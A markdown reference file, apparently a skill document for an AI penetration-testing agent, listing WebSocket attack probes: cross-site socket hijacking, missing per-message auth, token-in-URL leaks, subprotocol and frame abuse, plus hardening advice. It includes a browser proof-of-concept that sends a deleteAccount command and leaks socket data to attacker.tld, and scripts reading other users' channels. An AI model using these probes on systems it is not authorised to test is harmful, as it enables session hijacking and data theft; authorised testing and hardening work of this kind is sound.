---
name: WebSocket Security
description: Reference for WebSocket security testing covering CSWSH (origin validation), per-message authentication, token-in-URL leak, subprotocol abuse, and message-smuggling.
---

# WebSocket Security

Reference for testing WebSocket endpoints (`ws://`, `wss://`). Pull this in when you find a `/ws`, `/socket.io/`, `/realtime/`, or `/graphql` (subscriptions) endpoint and need a probe matrix for handshake auth, per-message validation, origin enforcement, and token transport.

> Black-box scope: probes drive the upgrade handshake and per-message frames. The kill chain lives between handshake-time auth (often present) and per-message auth (often absent).

## Tool wiring

| Action | Tool | Notes |
|---|---|---|
| Drive a WebSocket session | `execute_code` | Python `websockets` (already installed); subprotocols supported. |
| socket.io variant | `execute_code` | `pip install python-socketio` if needed. |
| Cross-origin handshake replay | `execute_curl` | Manual `Upgrade: websocket` request with custom `Origin`. |
| Browser-driven CSWSH | `execute_playwright` | Host attacker page, run `new WebSocket(...)` from a different origin. |

## Handshake primer

A WebSocket handshake is an HTTP/1.1 GET with the `Upgrade: websocket` header set:

```
GET /ws HTTP/1.1
Host: target.tld
Origin: https://target.tld
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: dGVzdA==
Sec-WebSocket-Protocol: graphql-transport-ws
Cookie: session=...
Authorization: Bearer ...
```

Server replies `101 Switching Protocols` to upgrade, or any other status to reject.

Critical: browsers send cookies on the WebSocket handshake. Browsers do NOT enforce same-origin on the WebSocket response. Server-side `Origin` validation is the ONLY guard against cross-site WebSocket hijacking.

## Reconnaissance

### Discover endpoints

```
/ws                /websocket           /socket            /sockets
/realtime          /streaming           /push              /events
/socket.io/        /sockjs/             /signalr/          /pusher/
/graphql           /subscriptions       /api/ws            /api/realtime
wss://api.target.tld/v1/ws
```

Often surfaced in JS bundles:

```
kali_shell: curl -s https://target.tld/static/js/main.*.js | grep -oE '(wss?://|new WebSocket\([^)]+\))'
```

### Fingerprint

| Signal | Stack |
|---|---|
| `/socket.io/?EIO=4&transport=polling` | Socket.IO |
| `Sec-WebSocket-Protocol: graphql-transport-ws` (or `graphql-ws`) | Apollo / GraphQL subscriptions |
| `Sec-WebSocket-Protocol: actioncable-v1-json` | Rails Action Cable |
| `Sec-WebSocket-Protocol: signalr` | ASP.NET SignalR |
| `phx_join` / `postgres_changes` payloads | Phoenix Channels (incl. Supabase Realtime) |
| `pusher:subscribe` payloads | Pusher / Pusher-compatible |
| `mqtt` subprotocol | MQTT-over-WS |
| `stomp` subprotocol | STOMP-over-WS |

## Attack matrix

### 1. Cross-Site WebSocket Hijacking (CSWSH)

The canonical CORS-equivalent for WebSockets. Browsers send cookies; if server-side `Origin` is not validated, an attacker page can open an authenticated socket.

```
execute_curl url: "wss://target.tld/ws" headers: "Origin: https://attacker.tld\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Version: 13\nSec-WebSocket-Key: dGVzdA==\nCookie: session=$VICTIM"
# Look for: 101 Switching Protocols
```

If the upgrade succeeds with attacker `Origin`, CSWSH is live. Browser PoC:

```html
<script>
const ws = new WebSocket("wss://target.tld/ws");
ws.onopen = () => ws.send(JSON.stringify({op:"deleteAccount"}));
ws.onmessage = e => fetch('https://attacker.tld/leak?d=' + encodeURIComponent(e.data));
</script>
```

### 2. Per-message authentication missing

Common pattern: server validates auth on `connection_init` / first message, then trusts subsequent messages.

```
execute_code language: python
import asyncio, json, websockets
async def go():
    async with websockets.connect("wss://target.tld/ws") as ws:
        # Authenticate as User A
        await ws.send(json.dumps({"type":"auth","token":"$TOKEN_A"}))
        await ws.recv()
        # Subscribe to User B's channel
        await ws.send(json.dumps({"op":"subscribe","topic":"orders:USER_B"}))
        for _ in range(10):
            print(await ws.recv())
asyncio.run(go())
```

If you receive User B's events while authenticated as User A, per-message authorization is missing.

### 3. Token-in-URL leak

Many apps put the bearer token in the WebSocket URL because the browser API doesn't allow custom headers on `new WebSocket(...)`:

```
wss://target.tld/ws?token=eyJhbGc...
wss://target.tld/ws?access_token=eyJhbGc...
```

Risks:

- URL is logged at every reverse proxy, CDN, and access log.
- URL leaks via `Referer` if the page later navigates to a tracked link.
- Browser history retains the URL.
- If JWT, the token now exists in N persistent log streams.

Probe:

```
execute_curl url: "wss://target.tld/ws?token=$TOKEN_A" headers: "Upgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Version: 13\nSec-WebSocket-Key: dGVzdA=="
# If 101, the token is being read from the URL
```

File as Information Disclosure + Token-in-URL.

### 4. Subprotocol confusion

```
Sec-WebSocket-Protocol: graphql-transport-ws, graphql-ws
```

Some servers honor the first; others the last. Mixing legacy `graphql-ws` (Apollo subscriptions-transport-ws) with `graphql-transport-ws` (modern) may swap state-machine handlers.

### 5. Frame fragmentation / opcode abuse

Per RFC 6455, WebSocket messages can be fragmented. Some servers reassemble incorrectly:

```
- Send TEXT frame (FIN=0, opcode=1): "AUTH "
- Send CONTINUATION frame (FIN=1, opcode=0): "ATTACK"
```

Server reassembly may produce `"AUTH ATTACK"` on one stack and `"ATTACK"` on another. Combined with text/binary mixing (opcode 1 vs 2), exploits exist on misimplemented parsers.

### 6. Message-payload smuggling (CVE-class)

Some apps embed JSON-with-nested-JSON. Crafted payloads with control chars can break out of the inner JSON to inject into the outer routing:

```json
{"channel":"public","data":"{\"_internal_route\":\"admin.deleteUser\"}"}
```

Server-side parsers that re-serialize the inner JSON without re-validation can be tricked into routing the payload to admin handlers.

### 7. STOMP / MQTT-over-WS topic injection

```
SUBSCRIBE
destination:/topic/users.*
id:0

```

If the server doesn't bind the destination to the authenticated principal, attacker subscribes to other users' topics.

```
SEND
destination:/topic/admin.commands
content-type:application/json

{"action":"deleteUser","id":42}
```

MQTT analogous via `subscribe` / `publish` to wildcards (`#`, `+`).

### 8. Socket.IO admin UI

`socket.io-admin-ui` exposes a debugging dashboard. If left enabled in production:

```
GET /socket.io/admin     -> Admin UI
GET /socket.io/?EIO=4&transport=polling&t=...   -> Polling fallback (sends cookies)
```

### 9. SignalR hub-method enumeration

```
GET /signalr/hubs
```

Returns the list of hubs and methods. Some apps forget to gate this in production.

```
{"hub":"adminHub","method":"deleteAllUsers","args":[]}
```

Sent over the SignalR connection if no per-method auth.

## Per-engine probes

### Apollo / GraphQL subscriptions

```
execute_code language: python
import asyncio, json, websockets
async def go():
    async with websockets.connect("wss://target.tld/graphql", subprotocols=["graphql-transport-ws"]) as ws:
        await ws.send(json.dumps({"type":"connection_init","payload":{"authorization":"Bearer $TOKEN"}}))
        await ws.recv()
        await ws.send(json.dumps({"id":"1","type":"subscribe","payload":{"query":"subscription { onAdminEvent { id userId payload } }"}}))
        for _ in range(20):
            print(await ws.recv())
asyncio.run(go())
```

See `/skill graphql` for the full GraphQL surface.

### Phoenix / Supabase Realtime

```
{"topic":"realtime:public:secrets","event":"phx_join","payload":{"config":{"postgres_changes":[{"event":"*","schema":"public","table":"secrets"}]},"access_token":"$TOKEN"},"ref":"1"}
```

See `/skill supabase` for the Supabase-specific probes.

### socket.io

```
execute_code language: python
import socketio
sio = socketio.Client()
sio.connect("https://target.tld", socketio_path="/socket.io")
sio.emit("subscribe", {"room": "admin"})
sio.wait()
```

## Tooling fallbacks

The brief lists `websocat` and `wsrepl` as missing. The Python `websockets` lib (now installed) covers the same probe surface; for socket.io the Python `python-socketio` client (pip-install on demand) is the equivalent.

## Validation shape

A clean WebSocket finding includes:

1. The endpoint URL and subprotocol negotiated.
2. The full handshake (request + 101 response with all headers).
3. Per-message PoC showing the authorization gap.
4. For CSWSH: a hosted HTML page demonstrating the cross-origin connection + capture of authenticated data.
5. For token-in-URL: at least one location where the URL is logged (reverse-proxy access log, CDN log, browser history reference).
6. The class explicitly named (CSWSH / per-message-auth / token-leak / subprotocol-confusion / frame-fragmentation / topic-injection / admin-UI / hub-enum).

## False positives

- Server-side `Origin` strictly validated; cross-origin handshake returns 403.
- Per-message auth enforced on every frame (verified by dropping the credential mid-stream and confirming the next message fails).
- Token in URL but the URL is rotated per-session and never logged (rare).
- Socket.IO admin UI present but behind admin-only authentication.
- SignalR hubs enumerable but every method enforces per-call authorization.

## Hardening summary

- Validate `Origin` on every handshake. Maintain an explicit allowlist; reject unknown origins.
- Authenticate every message frame, not only the handshake. JWT in `Authorization` header on the handshake plus per-message `nonce` is the cleanest model.
- Never put bearer tokens in the WebSocket URL. Use the `Authorization` header (HTTP handshake supports it) or a short-lived ticket exchanged just before the handshake.
- Bind subscriptions to the authenticated principal server-side. Reject filters / topics that reference other users / orgs.
- Use a single subprotocol; reject ambiguous handshakes.
- Disable Socket.IO admin UI / SignalR hub enumeration in production.
- For STOMP / MQTT-over-WS, enforce destination ACL per principal.

## Hand-off

```
CSWSH                          -> /skill csrf (cookie behavior across origins), /skill cors_misconfig
Per-message auth gap           -> chain with IDOR / mass assignment skills
Token-in-URL                   -> /skill information_disclosure
GraphQL subscriptions          -> /skill graphql
Supabase Realtime              -> /skill supabase
NestJS WebSocket gateway       -> /skill nestjs (WS guard section)
JWT replay over WS             -> /skill jwt_attacks
```

## Pro tips

- The handshake is HTTP. All standard HTTP probing applies (custom headers, cookies, query string).
- Browsers cannot set custom headers on `new WebSocket()` -- so any per-connection auth must be in the URL or a cookie. Both have problems.
- `Sec-WebSocket-Key` is a randomly-generated 16-byte base64 by the client; servers compute `Sec-WebSocket-Accept` deterministically. You can supply any client key when probing manually.
- `wss://` has all the TLS / cert pinning concerns of `https://`. Probe both `ws://` and `wss://` if both are reachable.
- Some socket.io servers expose a polling fallback (`/socket.io/?EIO=4&transport=polling`) that is HTTP-only -- sometimes the polling path skips auth checks the WebSocket path enforces.
